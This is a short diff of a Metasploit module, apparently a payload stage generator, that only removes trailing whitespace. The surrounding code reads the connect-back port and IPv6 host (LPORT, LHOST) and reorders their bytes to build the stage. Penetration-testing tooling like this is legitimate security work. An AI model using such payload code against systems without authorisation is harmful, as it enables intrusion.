@@ -32,10 +32,9 @@ module MetasploitModule
 def generate_stage(opts={})
       port_order = ([1,0])
       tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
-      tcp_port.pop 
-      tcp_port.shift 
+      tcp_port.pop
+      tcp_port.shift
       tcp_port = (port_order.map{|x| tcp_port[x]}).join('')
-      
       ip_order =  ([3, 2, 1, 0])
       my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
       first = (my_ipv6[0].unpack('H*')).to_s.scan(/../)
